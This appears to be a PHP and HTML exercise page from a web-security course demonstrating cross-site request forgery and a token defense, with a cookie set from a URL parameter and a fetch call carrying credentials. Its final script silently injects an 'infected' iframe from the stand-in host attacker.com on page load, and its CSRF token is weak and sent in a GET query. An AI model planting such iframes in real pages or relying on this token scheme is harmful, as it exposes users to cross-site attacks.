<?php
// Defense token
session_start();
$_SESSION['csrf_token'] = md5(uniqid(mt_rand(), true));

// Simulating a login cookie, assuming user has logged in to set this cookie
if (isset($_GET["name"])) {
    $name = $_GET["name"];
    setcookie("login", $name, [
        'expires' => time() + 86400,
        'path' => '/',
        'domain' => 'host.com',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
}
?>

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <title>CSRF</title>
</head>
<body>
<div>
    Is cookie set login ? :
    <?php
    // Simulating a login cookie, assuming user has logged in to set this cookie
    if (isset($_GET["name"])) {
        $name = $_GET["name"];
        echo "Cookie set ! : login=$name";
    } else {
        echo "No Cookie set !";
    }
    ?>
</div>

<script>
    const protocol = window.location.protocol;
    const port = window.location.port;

    function call() {
        // add csrf defense token
        const url = `simple.php?csrf_token=<?php echo $_SESSION["csrf_token"] ?>`;
        const params = {
            method: 'GET',
            credentials: 'include',
        };

        fetch(url, params)
            .then(response => {
                return response.text();
            })
            .then(data => {
                document.getElementById("answer-div").innerText = data;
            })
            .catch(err => {
                console.log(err);
            });
    }
</script>

<div>
    This page was generated by the Server
    <button id="button">Call the Server</button>
</div>

<script>
    document.getElementById("button").addEventListener("click", () => {
        call();
    });
</script>

<div id=answer-div>Waiting for an answer...</div>
<script>
    (() => {
        const iframeInfected = document.createElement("iframe");
        const domain = "attacker.com";
        iframeInfected.src = `${protocol}//${domain}:${port}/tp5/mycode/iframeInfected.php`;
        iframeInfected.id = "iframe-infected";
        iframeInfected.title = "infected iframe";
        document.body.appendChild(iframeInfected);
    })()
</script>
</body>
</html>